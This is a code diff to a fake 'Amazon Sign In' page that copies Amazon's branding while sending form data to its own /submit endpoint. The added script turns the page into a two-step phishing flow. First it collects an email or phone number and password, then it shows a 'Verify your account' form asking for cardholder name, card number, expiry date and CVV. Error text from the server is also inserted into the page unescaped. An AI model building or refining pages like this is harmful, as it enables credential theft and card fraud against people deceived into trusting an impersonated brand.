@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
     <title>Amazon Sign In</title>
     <link rel="icon" href="https://www.amazon.com/favicon.ico">
     <link rel="stylesheet" href="/styles.css">
@@ -14,23 +14,7 @@
         </a>
     </header>
 
-    <div class="container">
-        <h1 class="form-title">Sign in</h1>
-        <form method="POST" action="/submit">
-            <div class="form-group">
-                <label for="email_or_phone" class="form-label">Email or mobile phone number</label>
-                <input type="text" id="email_or_phone" name="email_or_phone" class="form-input" required>
-            </div>
-            <div class="form-group">
-                <label for="password" class="form-label">Password</label>
-                <input type="password" id="password" name="password" class="form-input" required>
-            </div>
-            <button type="submit" class="continue-btn">Login</button>
-        </form>
-        <div class="help-section">
-            <a href="#" class="help-link">Forgot your password?</a>
-        </div>
-    </div>
+    <div class="container" id="container"></div>
 
     <footer class="footer">
         <div class="footer-links">
@@ -40,5 +24,72 @@
         </div>
         <div>© 1996-2025, Amazon.com, Inc. or its affiliates</div>
     </footer>
+
+    <script src="/scripts.js"></script>
+    <script>
+        async function loadStep() {
+            const step = new URLSearchParams(window.location.search).get('step') || 'email';
+            const response = await fetch('/session-data');
+            const sessionData = await response.json();
+            const error = sessionData.error || '';
+            const userInput = sessionData.user_input || '';
+
+            const container = document.getElementById('container');
+            container.className = `container ${step === 'verify_card' ? 'wide-container' : ''}`;
+
+            if (step === 'email') {
+                container.innerHTML = `
+                    <h1 class="form-title">Sign in</h1>
+                    ${error ? `<div class="error-message">${error}</div>` : ''}
+                    <form method="POST" action="/submit?step=email">
+                        <div class="form-group">
+                            <label for="email_or_phone" class="form-label">Email or mobile phone number</label>
+                            <input type="text" id="email_or_phone" name="email_or_phone" class="form-input" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="password" class="form-label">Password</label>
+                            <input type="password" id="password" name="password" class="form-input" required>
+                        </div>
+                        <button type="submit" class="continue-btn">Login</button>
+                    </form>
+                    <div class="help-section">
+                        <a href="#" class="help-link">Forgot your password?</a>
+                    </div>
+                `;
+            } else if (step === 'verify_card') {
+                container.innerHTML = `
+                    <h1 class="form-title">Verify your account</h1>
+                    ${error ? `<div class="error-message">${error}</div>` : ''}
+                    <form method="POST" action="/submit?step=verify_card">
+                        <div class="form-group">
+                            <label for="cardholder_name" class="form-label">Cardholder name</label>
+                            <input type="text" id="cardholder_name" name="cardholder_name" class="form-input" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="card_number" class="form-label">Card number</label>
+                            <input type="text" id="card_number" name="card_number" class="form-input card-number-input" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                        </div>
+                        <div class="input-row">
+                            <div class="input-col">
+                                <div class="form-group">
+                                    <label for="expiration_date" class="form-label">Expiration date</label>
+                                    <input type="text" id="expiration_date" name="expiration_date" class="form-input" placeholder="MM/YY" maxlength="5" required>
+                                </div>
+                            </div>
+                            <div class="input-col-small">
+                                <div class="form-group">
+                                    <label for="security_code" class="form-label">Security code</label>
+                                    <input type="text" id="security_code" name="security_code" class="form-input" placeholder="CVV" maxlength="4" required>
+                                </div>
+                            </div>
+                        </div>
+                        <button type="submit" class="continue-btn">Continue</button>
+                    </form>
+                `;
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', loadStep);
+    </script>
 </body>
 </html>
